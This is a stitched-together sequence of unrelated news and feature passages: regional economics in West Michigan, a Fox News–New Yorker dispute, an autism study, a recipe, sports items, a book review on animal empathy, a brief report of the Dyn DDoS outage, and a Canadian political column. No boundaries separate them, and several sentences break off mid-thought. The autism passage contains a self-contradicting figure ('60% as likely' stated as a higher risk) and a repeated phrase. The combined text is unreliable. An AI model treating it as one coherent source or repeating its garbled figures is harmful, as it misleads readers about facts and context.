For years, West Michigan's economy has tracked ahead of the rest of the state. When the jobless rate in the worst-struck counties exceeded 20 percent at the height of the Great Recession, West Michigan's rate was half that. Now, it continues to do better, the byproduct of a diversified economy and a focus on shared success, according to economists and advocates for the region. "The uniqueness of West Michigan is the concerted effort to connect among business and community leaders (to) work together," said Jennifer Owens, president of Lakeshore Advantage, which promotes Allegan and Ottawa counties. She said companies are used to looking toward neighbors in the region, either through the local chamber or within their own industrial park, for suppliers and business partners. That may sound like a marketing pitch, and you'll hear it often from Owens and her peers. But Ballard and other economists noted it as well. "You get a kind of 'progressive-folks-going-about-their-business' vibe," Ballard said. On the civic side, the business community works together to identify and meet goals, from helping to found Grand Valley State University decades ago to
to downtown Grand Rapids. Regional leaders have supported downtown in other ways, promoting its
and events like ArtPrize, the public art event bankrolled by some of the region's biggest corporations sponsors. An estimated 400,000 people visit ArtPrize annually. The results have been impressive: The Grand Rapids region is one of
in the country. But replicating West Michigan's success elsewhere in Michigan may be difficult. "I think there is a shared culture on the west side of the state that's as strong or stronger than other parts of the state," Ballard said. A number of the region's leaders come from the same background, rooted in the waves of Dutch immigrants who began settling in the area in the 19th century. By 1900, 40 percent of the Grand Rapids population
Metro Detroit, by contrast, is far more diverse, its residents coming from across the globe and spread out over a vast area. Agreeing on one vision for a region of 4 million people can a trickier. And then there's the auto industry. Though West Michigan has long been a supplier for the industry, automotive work there doesn't dominate like it does in Metro Detroit. "West Michigan has been able to grow in ways that Southeast Michigan hasn't because West Michigan wasn't hampered as much by the shrinking of the auto industry," Ballard said. Part of it was accidental, but some was purposeful. Steelcase, the furniture giant, did solid business with the automotive industry. But it diversified its portfolio, lessening its reliance on auto work, said McAlinden, the automotive economist. "West Michigan dodged a bullet in terms of its industrial mix," MSU's Ballard said. But, "it's not all that they were lucky."
Big business, but willing to help
That West Michigan mix includes office furniture (Steelcase, Herman Miller, Haworth), pharmaceuticals (Perrigo), advanced manufacturing (Johnson Controls, Gentex, Magna International, Lacks Enterprises) as well as hospitals and higher education.

"The West Michigan area doesn't hang its hat on one producer," said Owens of Lakeshore Advantage. Those companies are the region's anchors. But they're also advocates for newer businesses. Jeff Disher, who started his engineering career for the former Prince Automotive (bought in 1996 by Johnson Controls; later sold in several transactions), aspired to own his own firm. He started in 2000 with one employee - himself. Innotec, a relatively new firm in 2000 that included other Prince alumni, agreed to take a chance on Disher. It worked out and now, more than 15 years later, Disher, his design and engineering firm, employs over 100 people in nearby Zeeland and in Ann Arbor. "People see that when you help your neighborhood out, there's a reward there for everyone," Disher said. That could be West Michigan's mantra. Birgit Klohs, president and CEO of The Right Place, which promotes West Michigan, sells the region to others this way: "This is a very committed, collaborative region," she said.
When business meets politics
Some conservative business principles embraced in West Michigan, however, have expanded across the state in ways that haven't pleased everyone. The region has one of the
in organized labor in Michigan. About 5 percent of private industry workers in the Grand Rapids region are union members, compared with 11 percent in Metro Detroit and statewide. Owens said that lower labor costs are one of the reasons that outside companies are attracted to West Michigan. What has irritated many backers of the labor movement, however, was the strong push by one West Michigan family in an ultimately successful 2012 campaign to enact right-to-work laws - making union membership voluntary - in a state was the birthplace of the United Auto Workers. Many see the
for right-to-work as part of a conservative business agenda that has outsized power that doesn't work everywhere in Michigan. The DeVos family is among the
. They support conservative candidates and causes nationally as well. "They're sort of the 800 pound gorilla in the state," said Zack Pohl, spokesman for the Michigan AFL-CIO, which has railed against the
in Lansing. West Michigan residents may think of the DeVos family differently. They are a visible part of the fabric of the community; the family name is on the medical, educational and civic buildings whose organizations have shared in their philanthropy. And it has backed a $15 million venture capital fund in 2012, giving entrepreneurs five minutes to make a pitch that could get them $5,000 in support.
ultimately backed 190 business ideas with $5,000 each and another 91 with bigger investments. The group is currently developing a new model with the goal of supporting "developing companies" on a broader scale. It is part of a business attitude that nurtures growth, said Disher, the engineer. "People have opportunity," he said. "Like-minded people attract each other." And now, he's doing his best to attract even more. At a time when the economy is hot, Disher has added to his business: He's become a talent recruiter.

Having previously warned that The Fed's "fixation with the markets has created a deadly trap," and recently noted that "Central Banking has lost its way," Stephen Roach unleashed a few minutes of painfully honest truthiness on an unsuspecting Kelly Evans at CNBC. The brief interview reiterates Roach's previous comments, as Tim Iacono notes, that "it didn't have to be this way." The Fed "is in total denial," Roach rants, adding that it "hasn't learned the lessons of what it put the world through a decade ago."
Roach in 2005 (via Morgan Stanley):
"It didn't have to be this way. The big mistake, in my view, came when the Fed condoned the equity bubble in the late 1990s.
It has been playing post-bubble defense ever since, fostering an unusually low real interest rate climate that has led to one bubble after another.
And that has given rise to the real monster -- the asset-dependent American consumer and a co-dependent global economy that can't live without excess US consumption.
The real test was always the exit strategy."
The following is only for those who have an obsessive interest in petty squabbles between Fox News hosts and New Yorker scribblers. Consider yourself warned. My first inkling of my week as a Bill O'Reilly guest star came on Tuesday morning, December 2nd, as I was leaving home to go to work. I hadn't had my coffee yet. I hadn't even checked my e-mail. I was not at my most intellectually acute. Two youngish guys dressed in slacker clothes—one with a microphone, the other with a camera—accosted me on the sidewalk in front of my apartment building. The guy with the microphone stuck it in my face and started badgering me with questions about why I had called Newt Gingrich a bigot. The guy didn't say who he was or whom he represented, and his mike didn't have one of those identifying doohickeys on it, so it took me a minute or two to figure out what was going on. It helped when he mentioned O'Reilly—that conjured up a vague memory of seeing something similar on “The O'Reilly Factor.” (Maybe when the “ambushee” was Bill Moyers?) At that point, I suppose, I should have just given the guy my business card and suggested that if Mr. O'Reilly wanted to interview me, he should have someone get in touch with me at the office. But, as I say, no coffee yet. Also, I have a weakness for street weirdos. So I talked to the guy for, I don't know, five or ten minutes. Then, on my way to the subway, I turned on my BlackBerry. There was a note from Matt Cooper, of Condé Nast Portfolio:
As a devoted Fox viewer, I probably don't need to tell you, but Bill O'Reilly was on your case last night, complete with putting up a picture of you on the screen. Hope all's well.When I got to the office, our P.R. person, Alexa Cassanos, showed me the video clip from the night before. Unfortunately it's neither embeddable nor linkable—Alexa got it from some special service she subscribes to—but it is describable. It's on the “Reality Check” segment, sandwiched between attacks on the Times and Al Franken. O'Reilly says:
Next to the New York Times, The New Yorker magazine is perhaps the most politically correct publication in the mainstream media. And one of their columnists, Hendrik Hertzberg, is a flat-out deceiver. On the screen: this picture of me. I'd never seen it before. It must have been taken after I bruised my jaw body-surfing a couple of summers ago and couldn't shave for a few weeks. Then the screen changes to a text box—
—and O'Reilly continues, reading the quote:
Writing about gay marriage and the vote in California Hertzberg says, quote, “Like a polluted swamp, anti-gay bigotry is likely to get thicker and more toxic as it dries up…. Newt Gingrich, the former House Speaker, said the other day (on the air, to Bill O'Reilly), “I think are is a gay and secular fascism in this country that wants to impose its will on the rest of us….”Now just O'Reilly's face on the screen:
What Hertzberg did not tell New Yorker readers is that that conversation with Speaker Gingrich was about gay violence against a Christian missionary in San Francisco. It had nothing to do with the gay marriage vote, only militant reaction to it. Hertzberg does this kind of dishonest stuff all the time, because he knows many of his readers never watch “The Factor” and Gingrich and I are easy targets for his distortions. Hertzberg owes Newt Gingrich a written apology for taking his remarks completely out of context. And The New Yorker magazine should be ashamed to publish a dishonest guy like this.End of segment. After modestly accepting congratulations from several colleagues (and some ribbing from David Remnick, our editor), I went to my office as usual. The next day, Wednesday, Remnick got an e-mail from one of O'Reilly's producers, Ron Mitchell. Can you bear to read the whole thing?
I have contacted Alexa Cassanos about this, but also wanted to send this directly to you. Bill O'Reilly has taken issue with certain statements that appeared in Mr. Hertzberg's piece from your December 1st issue. Mr. Hertzberg, who recounts a recent installment of The O'Reilly Factor, has accused former House Speaker Newt Gingrich of being an anti-gay “bigot” while ignoring the context of the conversation between Speaker Gingrich and Mr. O'Reilly. It seems unlikely that Mr. Hertzberg actually saw the show, but relied upon 2nd hand accounts of that conversation. I have included a timeline and transcript of what happened. It is clear that Speaker Gingrich is referring to several well-publicized accounts of gay marriage proponents engaged in activities such as storming a church in Michigan and assaulting a Christian group in San Francisco. He is not referring to an entire group of people. We believe that Mr. Hertzberg owes Speaker Gingrich an apology and are asking for a statement from you on this matter. I am sure that you will agree that a serious allegation like this deserves your immediate attention.We're still in Mitchell's e-mail. There's more—his “timeline and transcript”:
1-On the November 14 edition of The O'Reilly Factor, the following exchange happened between O'Reilly and Newt Gingrich: > > O'REILLY: .he didn't have the power that she has. And he didn't have a husband or a wife like he does. OK, now the culture war, I know you've been flying around the country and doing stuff. In the last three or four days, really nasty stuff. I mean, you know, hyper. We're going to show you some of the video. A woman getting a cross smashed out of her hand. We had a church in Michigan invaded by gay activists. We're going to show you the video on Monday of that. We have exclusively. We had a guy in Sacramento fired from his job. We have boycotts called on restaurants. I mean, it is getting out of control very few days after the election. How do you assess that? GINGRICH: Look, I think there is a gay and secular fascism in this country that wants to impose its will on the rest of us. It is prepared to use violence, to use harassment. I think it is prepared to use the government, if it can get control of it. I think that it is a very dangerous threat to anybody who believes in traditional religion. And I think if you believe in historic Christianity, you have to confront the fact, and frankly for that matter if you believe in the historic version of Islam or the historic version of Judaism, you have to confront the reality that the secular extremists are determined to impose on you acceptance of a series of values that are antithetical, they're the opposite of what you're taught in Sunday school.> 2-On November 17, MediaMatters.org posted the following headline and summary:> > Gingrich: “[T]here is a gay and secular fascism in this country that wants to impose its will on the rest of us” Summary: Discussing actions by individual protesters of Proposition 8, Newt Gingrich stated: “I think there is a gay and secular fascism in this country that wants to impose its will on the rest of us, is prepared to use violence, to use harassment. I think it is prepared to use the government if it can get control of it. I think that it is a very dangerous threat to anybody who believes in traditional religion.” > 3-In the December 1 issue of The New Yorker, Hendrick Hertzberg wrote this in his piece (p.27):> > Like a polluted swamp, anti-gay bigotry is likely to get thicker and more toxic as it dries up. Viciousness meets viscousness. “Look,” Newt Gingrich, the former House Speaker, said the other day (on the air, to Bill O'Reilly), “I think there is a gay and secular fascism in this country that wants to impose its will on the rest of us, is prepared to use violence… . I think that it is a very dangerous threat to anybody who believes in traditional religion. And I think if you believe in historic Christianity, you have to confront the fact.” For diversity's sake, he added that “the historic version of Islam” and “the historic version of Judaism” are likewise menaced—which is natural, given that gay, secular, fascist values are “the opposite of what you're taught in Sunday school.” This sort of sludge may or may not prove to be of some slight utility in the 2012 Republican primaries, but it is, increasingly, history.> Ron Mitchell
Senior Producer, The O'Reilly Factor
Fox News ChannelRemnick's reply, later that day:
Dear Mr. Mitchell, Thank you for your email. I've read your note carefully, and more than once, and, of course, have read Hendrik Hertzberg's piece again. It's simple: I stand behind, and with, Mr. Hertzberg; that is, as the editor of the magazine, I have no problem with the piece he wrote. Any other back-and-forth would likely be more productive with him. Respectfully yours,
DavidThat evening, the Wednesday, December 3rd, edition of “The O'Reilly Factor” came and went with no video of me and the guy with the microphone. That seemed to be that. Then, at about half past midnight last night (i.e., shortly after Wednesday became Thursday), I checked my e-mail one last time and found this, sent a couple of hours earlier by someone called Steve:
Subj: Don't Lie in your editorials Dude! When the gays and dykes crash into churches to impose their idealogy violently on average americans and destroy signs of opposing views, that's fascism!!! Get your facts right before you spout propaganda!!Gathering from this that O'Reilly had found some usable footage after all, I turned on the TV. Luckily, his program is rebroadcast from midnight to 1 A.M. Sure enough:
In fairness to the O'Reilly video-editing team, I have to say that they probably could have made me look even worse. On the other hand, they could have made me look rather better. F and B. For what it's worth, in my original piece for the magazine, I didn't accuse Gingrich of being a bigot, let alone a “vicious bigot,” as the guy with the mike put it. I think it's fairly clear that what I did accuse him of was playing to bigotry. Nor do I think I took Gingrich out of context. In Gingrich's November 14th interview with O'Reilly, the context is O'Reilly's mention of two instances of disruptive thuggery, one person being “fired” (the reference is to the artistic director of the California Musical Theatre, who resigned under pressure after colleagues and financial contributors objected to his financial support of the California anti-gay-marriage ballot item), and some boycotts of restaurants. As O'Reilly talks, the screen shows pictures of people protesting peacefully and carrying signs. The thuggery O'Reilly mentions was contemptible, but the rest of it was just normal democratic protest. (O'Reilly himself frequently asks his viewers to boycott businesses that offend him, such as department stores whose employees wish customers “Happy Holidays” instead of “Merry Christmas.”) None of it comes anywhere near “fascism,” let alone some sort of fascist “movement” that could plausibly threaten to take over the government. I don't think it was at all unreasonable for me to infer that the targets of Mr. Gingrich's “fascism” remarks were the mainstream gay-rights movement in general and the opponents of Proposition 8 in particular. One more thing. O'Reilly said last night that I “refused to come on ‘The Factor,'” as he calls his program. This is simply a lie. Neither he nor any of his staff asked me to appear on his program, either directly or through anyone else at The New Yorker. I'm puzzled that O'Reilly said otherwise, since he has to know that we know he was lying. I guess he just doesn't care. He's got his base.
Update: One more exchange between Ron Mitchell, the O'Reilly producer at Fox, and David Remnick, from late this afternoon (Friday, December 5th). Mitchell to Remnick:
Much has been said about all this over the last few days. I just still want to make sure that you are comfortable with the whole situation. If you think that you have not been treated fairly, please let me know, and we can do something with you on the air.Remnick to Mitchell:
Dear Mr. Mitchell,
Thanks for your courteous note. It's an interesting contrast in tone with the the fantastical on-air description of Rick as a left-wing zealot, the nonsense that he had refused a real interview before sending a crew to his apartment building, and the sneering descriptions of Rick, me, and the magazine from Mr O'Reilly on air. Quite a performance. So while I appreciate your note, you'll forgive me if I pass in wanting to engage this any more. What I said at the start stands: I thought Rick's piece, considering Newt Gingrich's language, was, as you might put it, fair and balanced.Respectfully yours, David Remnick

The results are the first to suggest a trans-generational contributor to the developmental disorder.
The study, published in the journal JAMA Psychiatry, is the first to examine the potential legacy that a mother's experience with childhood abuse could have on the health of her own children. The findings are especially sobering given the latest statistics released from the Centers for Disease Control, which found a significantly higher rate of autism spectrum disorders (ASD) — one in 50 compared to one in 88 from a report released in 2012 — among school-aged children than previously thought.
The authors of the JAMA Psychiatry paper studied more than 50,000 women enrolled in the Nurse's Health Study II, who were asked about any history of abuse before they were 12. The questions delved into both physical and emotional abuse, as the women evaluated whether they had been hit hard enough to leave bruises, as well as whether adults or caregivers had insulted, screamed or yelled at them. They also filled out questionnaires about whether their own children were diagnosed with autism spectrum disorders. The scientists also had access to the nurses' health records, so they could adjust for other maternal health factors known to influence autism risk, including nine pregnancy-related conditions such as preeclampsia, gestational diabetes, alcohol consumption and smoking.
(MORE: Autism: Why Some Children ‘Bloom' and Overcome Their Disabilities)
Women who reported physical, emotional, or sexual abuse when they were young were more likely to have a child with autism compared to women who were not abused. The more severely the women were abused, the higher their chances of having a child with autism; compared to women who weren't abused, those who endured the most serious mistreatment were 60% as likely to have an autistic child.
Because it's possible that a mother's exposure to abuse as a child could also lead her to engage in behaviors associated with harming the fetus — such as smoking, drinking during pregnancy, using drugs, being overweight, having preterm labor or giving birth to a premature or low birth weight baby — the scientists also calculated how much these factors contributed to the risk of ASD in the next generation. To their surprise, these conditions explained only 7% of the heightened risk among the abused women. That meant that abuse was exerting more lasting effects on the women's bodies that were translating into an increased risk of autism in their children.
(MORE: Older Fathers Linked to Children's Autism and Schizophrenia Risk)
How? The researchers believe that some of the lifestyle circumstances associated with abuse, such as poor nutrition, could be responsible for some of the association. It's also possible that abuse causes biological changes in a woman's immune system, including disruption of the stress response, that could lead to harmful effects on a developing fetus. Studies have shown that autistic children showed abnormal stress responses, and it's possible that a mother's altered stress reaction could be passed on to her child. “Maternal inflammation affects the developing brain, and maternal inflammation and immune function have been hypothesized to be causes of autism,” the researchers write.
The researchers also speculate that childhood abuse can leave women in a state of chronic stress; the constant release of stress-related hormones could also increase a developing child's chances of developing autism, since such androgens have been associated with autistic symptoms. Finally, a mother's childhood abuse could be an indicator of a genetic risk for mental illness, which is often associated with abuse of youngsters. Studies showed that mental illness and autism may share genetic risk factors, “therefore, the perpetration of child abuse by grandparents and experience of abuse in childhood by the mother may be indicators of genetic risk for autism in the child,” the study authors write.
(MORE: How Pets Can Help Autistic Children Learn to Share and Comfort Others)
“Childhood abuse is associated with a wide array of health problems in the person who experiences it, including both mental health outcomes like depression and anxiety, and physical health outcomes like depression and anxiety, and physical health outcomes like obesity and lung disease,” said senior study author Marc Weisskopf, an associate professor of environmental and occupational epidemiology at Harvard School of Public Health, in a statement. “Our research suggests that the effects of childhood abuse may also reach across generations.”
Is that legacy enough to explain the apparent rise in ASD documented in the most recent government data? The CDC data was based on parental reports of autism; a representative sample of parents is asked whether a doctor had diagnosed their child with autism, and some experts caution that such reports are not as reliable as health records documenting the disorder. Still, the latest statistics suggest that at least awareness of ASDs is increasing, and with it, potential explanations for what might be contributing to the disorder.
If childhood abuse turns out to be one of these reasons for the rise in autism cases, then efforts to prevent it take on new urgency, since such interventions can benefit more than just one victim.

Prepare the pasta: In a small pan, warm the milk, onion, garlic and bay leaf until almost boiling. Remove from the heat, leave covered to infuse for 10 mins, then strain. Cook the macaroni according to pack instructions until just soft, but still with a little bite (this is called al dente in Italian). This will take about 10 mins. Drain in a colander, then run under the tap and stir to stop the pasta sticking together.
Make a roux: (A roux is simply flour and fat, cooked together, then used to thicken sauces.) Heat oven to 190C/ fan 170C/gas 5 and butter a 25 x 18cm ovenproof dish. Melt the butter in the medium pan. When foaming, add the flour, then cook, stirring constantly, for 1 min on a low heat.
Finish the sauce: Slowly stir the warm infused milk into the roux until smooth. Simmer for 3-4 mins, stirring often, until the sauce has thickened and has a coating consistency (run your finger through the sauce on a spoon – it should leave a trail). Remove the pan from the heat, then add the cheddar and mustard powder. Season, then stir until the cheese has melted.
Assemble and bake: Mix the cheesesauce through the macaroni to coat it well, then tip into the prepared dish. Sprinkle the Parmesan and breadcrumbs over the top, then bake for 15-20 mins until golden brown and bubbling. Serve piping hot on its own or with a green salad.
Bellator Kickboxing 7 airs tonight on Spike at 11 p.m. ET, but – spoiler alert! – the event already took place Sept. 23, as part of a doubleheader with Bellator 183.
In the main event, Kevin Ross and Domenico Lomurno squared off for the inaugural featherweight title in front of thousands of fans at SAP Center in San Jose, Calif. Which is great and all, but former MMA star Gina Carano wishes it wasn't being televised on a two-week tape delay.
“This is so awesome for Bellator to put on kickboxing for such a huge stage,” Carano told MMAjunkie on the night of the event. “But I personally think it should've been live. This sh*t should've been live.”
Carano was on hand to support her fiancée, Ross, as well as MMA fighter Gaston Bolanos, who she trains with. Carano's hope is that more MMA fans will give kickboxing – and other combat sports that are part of MMA – more of a chance.
“You know what I think? Basically, f*ck chances. F*ck it,” Carano said. “You do something, because you're passionate about it, because it changed your life, because it made you a better person. And there's a bunch of jiu-jitsu people and their group of people that make them a better person. We should shine the light on them, and we should also shine the light on these kickboxers and muay Thai people. I get that MMA puts it all together, and it's its own animal. But there's this underground thing.”
Carano at one point was the most recognizable women's MMA star during the late 2000s, putting the now-defunct EliteXC on the map before losing to current UFC women's featherweight champion Cris Cyborg in a 2009 Strikeforce title fight.
Carano alluded to her in-cage stardom being limited because of a general lack of major exposure for women's MMA and would like kickboxing stars to not experience the same thing. She'd like them to have the opportunity to show what they're all about.
“Thank you, Bellator and (president) Scott Coker, for always staying loyal to putting these cards out,” Carano said. “That means the world. But you're not going to find these people like Kevin Ross and Joe Schilling. You already missed a lot of legends that came before them. You should expose the legends that we have now.”

Frans de Waal, director of the Living Links Center at the Yerkes National Primate Research Center in Atlanta, believes that it's just as natural to be nice as it is being mean. Man may be wolf to man, as the old saying has it, but de Waal points out with casual eloquence in The Age of Empathy that wolves are often quite lovely to one another.
The scientific history of good nature in humans and other animals is a notably short one. Feelings like sympathy and concern, as well as acts of charity and nurture, have traditionally been ignored or dismissed. The study of niceness was a casualty of the Behaviorist school of psychology in the early 20th century, which defined the cognitive and emotional lives of animals out of existence altogether.
Philosophy and religion, as well as science, have long suggested that caring and kindness do not come from our biology but instead are ways in which we overcome our biology: Niceness is a refinement. Contrast the ease with which aggression, domination, and violence are attributed to our DNA. In the era of the “selfish gene,” any animal altruism gets recast as self-interest in disguise. The columnist David Brooks has summarized the findings like this: “From the content of our genes, the nature of our neurons and the lessons of evolution, it has become clear that nature is filled with competition and conflicts of interest.”
But lately scientists, from biologists to psychologists—with de Waal at the forefront—have begun suggesting that nature is filled with compassion, too. This isn't a mere pendulum swing to warmth and cuddliness. Research on social animals—like elephants, dolphins, baboons, chimpanzees (deWaal's specialty), and even hyenas—has complicated what has for too long been a reductive picture. These animals participate in dynamic societies made up of individuals, and their lives are replete with feelings, decisions, and intentions, rooted in biology yet elaborated in cooperative—and competitive—interaction. By comparing their worlds, with each other and with our own, de Waal explains, we can learn about the true anatomy of the social psyche. The result should deliver a jolt: Nature isn't so red in tooth and claw, and civilization may not be so neatly edifying. In fact, if we have a destructive impulse to watch out for, it may be our readiness to embrace the “civilized” view that deep down we're horrible.
De Waal, whose office sits perched atop the perimeter of a chimpanzee compound, has written extensively about the mutable hierarchies, loyal alliances, and intensely complicated politics of chimpanzee life. Like other primatologists, he has also observed that many deeply felt human attitudes and ideas have suggestive precursors in chimpanzee behavior. Here's one that David Brooks might like: Ownership, it seems, is a profoundly ancient right if you are a primate. In decades of observations at the Yerkes colony, de Waal has noted that if the chimpanzees are given shareable food, like watermelons, they will race to get their hands on it. This is because whichever chimpanzee gets the watermelon first, even the lowliest cur, will be respected as the owner of that morsel by the most dominant chimpanzee. Its mates may beg and whine for some of it, but no one will take the food away.
But possession is only part of the story. The thing about ownership, says de Waal, is that in nature it goes hand in hand with sharing. Only 20 minutes after the food is put out, every chimpanzee in the colony will have some. “Owners share with their best buddies and family, who in turn share with their best buddies and family,” he writes. Though there is some tussling, the result is more peaceful than not. The ownership/sharing principle is as true for killer whales and wolves as it is for chimpanzees, according to de Waal. And as ownership goes with sharing, so does compromise with justice and, yes, bickering with peacekeeping. Fairness matters to social animals. If two monkeys perform the same task but are given different-size rewards, the monkey that is cheated acts cheated. It will refuse to do its job in the face of such inequity.
Humans, of course, are social animals, too, and de Waal argues that feeling and acting with empathy for one another are as automatic as aggression—part of our “bipolar nature.” It's a good phrase that handily refutes the biology-is-all-bad idea, but with its suggestion of flip sides, it may miss what is most interesting about de Waal's findings, which is that they challenge our penchant for tidy dichotomies. Some psychological traits are best understood as mosaiclike assemblages with seams that are invisible to us if all we do is look in the mirror. Take empathy. For humans, as comparative work with animals has helped to clarify, empathy has at least three layers.
The first is emotional contagion, the flush of emotion that runs involuntarily through a group of animals when something dramatic happens, like an eagle appearing above a group of monkeys or a man being punched on a crowded street. The next layer is feeling for others, our sympathetic response when we see another's predicament. This happens via the body, says de Waal, and such “body-mapping” has been shown again and again in animals as well as humans. An old film of a chimpanzee on a stack of boxes reaching high for a banana shows another chimpanzee watching it, arms stretched up in sympathy. De Waal once watched a chimpanzee give birth, standing upright with her hands cupped beneath ready to catch her baby. An older female watching cupped her hands beneath her, too, of no practical help but full of feeling. In humans, such unpremeditated feeling has been shown by a Swedish psychologist who put electrodes on people's face to prove that when we see pictures of angry faces, we frown; when we see happy faces, our mouths turn up.
The third part of empathy is what de Waal calls “targeted helping.” It's the ability of onlookers to think their way into the mind of someone who needs help and, crucially, to give the kind of help that's required. Humans do this all the time. If I see that you've dropped a heavy bag onto your foot, I'm going to try to move the bag, and if you're hurt, I'll console you. There has lately been, as de Waal puts it, “an avalanche” of research on abilities like perspective taking in apes, monkeys, dogs, and big-brained birds, and his book is packed with them. Joshua Plotnik, one of de Waal's colleagues in Thailand, witnessed one elephant try to push her dying friend into a standing position. When that didn't work, she stood supportively by her dying companion for days, even as humans tried to tempt her away with food. If a chimpanzee has lost its child, other chimpanzees will spend a lot more time grooming it. De Waal watched one chimpanzee mother take great care helping her son with a broken wrist, even at the cost of her younger offspring. (Indeed, de Waal says that the bond between mother and child is the template for all our relationships, even romantic ones.)
Yet it is a mistake, given this evidence of natural empathy, to assume that the trait is a tidy bundle that animals either have or don't. Chimpanzees and humans, both apes, seem to have the same type of empathy, and undoubtedly this is because we are very closely related. But monkeys—which are more distantly related to us (and to chimpanzees, for that matter)—are a different story. De Waal spent years searching for the last human dimension of empathy—consolation—in monkeys but was forced to conclude that they don't have it. Consider the baboon, an Old World monkey. They don't make up after fights, and they don't accommodate another baboon's injuries. One researcher showed that if baboons lose a family member to a predator (sometimes being forced to hear their kin's bones crunched), other baboons won't groom it more. Even worse is baboon parenting. De Waal describes a band of baboons that crossed a flooded patch of the Okavango Delta in Botswana, only to look back and see that their offspring had been marooned on the patch of land they left behind. The water was too deep for the youngsters, who cried out in distress. The adult baboons occasionally answered their calls, but they never stepped into the water to go retrieve their stranded offspring in time. They couldn't see their own capacity to change the situation. They were themselves marooned in a painful psychic landscape.
There is no word for what that particularly baboon combination of emotional parts is. To us, it just looks like an excruciatingly deficient version of human empathy. But from the perspective of evolution, it is its own thing, a distinctive trait that we've never really identified before. And this is what de Waal and scholars like him have begun to track. In doing so, they're building a universal catalog of emotions and ideas that is not human-centric, a body of work that describes what it feels like to be biological. The endeavor has majesty. It also affirms a very unmajestic human experience: Our emotions are a mess. Of course they are—they are accumulated bits of psychic life thrown together over millions of years by evolution with no oversight or quality control about what they actually feel like. Just because we have a single word for a feeling or trait now doesn't mean that it is homogenous or discrete.
Developing an appreciation of this complexity, de Waal suggests, could actually combat one of the least helpful of human tendencies: the impulse—not innate but socially very contagious—to reductively assume our biology is bad. As de Waal sees it, if we take that view—and the vogue of the “selfish gene” indicates we do—it becomes a self-fulfilling prophecy, for human behavior is decisively shaped by our sense of ourselves. By way of example, de Waal offers up Enron CEO Jeff Skilling, who was infamous for his brutal treatment of his own employees, never mind his exploitative approach to his company's shareholders and regulators. Evidently inspired by Richard Dawkins' The Selfish Gene, he justified his actions with the belief that all people were ultimately motivated only by greed and fear. But Skilling had the science wrong, as does almost everyone else. Genes act in “self-preserving” ways, de Waal explains, but that has nothing to do with human behavior. Dawkins never meant that selfish genes build selfish people.
Competing genes build complicated people, who aren't just instinctively cruel but also involuntarily caring and curious. Which is why you are still wondering what happened to those poor baby baboons—and why we should hope de Waal continues to keep a wise eye on his chimpanzees.
The Portland Thorns had the most epic championship celebration ever
The Portland Thorns won their second NWSL championship on Saturday, with a 1-0 win over the North Carolina Courage, and had a celebration for the ages waiting for them upon their arrival on Sunday.
Met by hundreds of fans at the airport, the party started almost as soon as they got off the plane and didn't stop until the very end of the night.
The team was then honored during halftime of the Portland Timbers game and then held a victory rally at Providence Park. In perhaps unsurprising news for a team that averages more than 17,000 fans per game, thousands upon thousands of supporters showed up to celebrate the championship.
And if you're wondering just how enthusiastic the crowd was, please watch this video below, and make sure your volume is on.
I hope every other fan base was taking notes with this one. We can all learn from your amazingness, Thorns' fans.

DNS Provider DDoSed leading to Internet outage in Mid West and East Cost United States
Twitter, Spotify, Reddit, The New York Times, others unavailable to US visitors
Internet service was disrupted for many people in the Eastern and Mid-West United States on Friday after a web-hosting service was attacked by hackers. The outage was massive as can be seen in the image below.
The outage occurred after unknown hackers launched a Distributed Denial of Service (DDoS) attack on Dyn Inc., a significant Domain Name Server provider.
“Some customers may experience increased DNS query latency and delayed zone propagation during this time,” Dyn said in a note posted on its website. “Our Engineers are continuing to work on mitigating this issue.”
Twitter, Spotify, Reddit and The New York Times, among other sites, were all reported to be disrupted, according to numerous postings from people on social media. According to a post on Hacker News , these sites have been affected with many being unable to use their services.
Though reports suggested that it is mostly those based on the US east coast users who are unable to access the Internet, but some European users are also complaining about non-availability of websites.

Stéphane Dion might just owe Professor Michael Lynk of Western University an apology — even if he does end up making it on Twitter.
He certainly owes the accomplished labour arbitrator and human rights advocate something he hasn't given him so far: a fair hearing.
On March 25, Canada's foreign minister waded into an internal United Nations matter after news emerged of Lynk's appointment by the UN Human Rights Council as Special Rapporteur for the Palestinian Territories. Here's what Dion said:
“We call on @UNHRC to review this appointment & ensure Special Rapporteur has the track record that can advance peace in the region.”
Such a request, coming from one of the most powerful ministers in the Trudeau government, isn't exactly what the Canadian recipient of such a prestigious appointment would expect to hear. Nor would that person expect the minister to broadcast his misgivings via social media.
At the very least, one would have expected Dion to reach out to Lynk directly before publicly throwing the weight of the federal government behind his apparent doubts about Lynk's credentials — a tactic grimly familiar to anyone who remembers how Stephen Harper and his ministers routinely used their power platforms to trash public servants from a safe distance.
“The minister did not contact me before he tweeted,” Lynk told iPolitics. “Nor did I hear from any of his officials. I would have expected that they would have done due diligence.”
Instead, Dion apparently let a pro-Israeli lobby group, UN Watch, do his research for him. That group mined and then distributed a highly-compressed version of Lynk's scholarly writing over the years, producing what he calls “gotcha” quotes making a number of inflammatory accusations.
For example, the UN Watch report claimed that Lynk cited Nazi war crimes in his call for “legal strategies” to prosecute Israelis. Had Dion talked to the academic himself, he would have heard the response Lynk gave iPolitics.
“Some people seem to be going to great lengths to misunderstand me. The essay that I was invited to write addressed the wall opinion from the International Court of Justice in 2004, its relationship to the Israeli settlements. I was not asked to address any of the topics that UN Watch mentions, so that gun fails to fire.
“I did not use, and I never have used, the Nazi analogy to describe Israel and its occupation on Palestinian Territories. That comparison is odious.”
Similarly, UN Watch noted that on November 29, 2001, Lynk gave the keynote address at the International Day of Solidarity with Palestinians, where he spoke of “popular resistance.” The inference in the report is that he was fomenting violence against Israel. Here's the reality Dion missed by not doing his own homework:
“I was introduced as the speaker at the event by the Honourable Flora Macdonald. My speech focused on international law regarding Jerusalem, the occupation, the Israeli settlements and the refugee issue. I did not speak on popular resistance, although if I had, I would have spoken about peaceful protests and civil disobedience.”
It is worth noting a portion of the last paragraph of Lynk's speech back in 2001, which was not mentioned in the UN Watch report:
“The way out of the unendurable Middle East conflict has to focus on a guarantee of the national and human rights for both Israelis and Palestinians. Both are entitled to live in security and liberty. Both have the right to a viable state …”
UN Watch also accused Lynk of seeking “victory” at the International Criminal Court (ICC) by isolating Israel and re-establishing through the courts “the importance of universal values.” Actually, that was the stated opinion of the UN itself, which Lynk was merely repeating.
“In the article,” Lynk said, “I was commenting on the release in 2013 by the United Nations Human Rights Council of a report on the Israeli settlements, their adverse human rights consequences and their illegality under international law. I noted that the UN report called for the international community to enforce its own body of international law and refer the issue of the Israeli settlements to the International Criminal Court.”
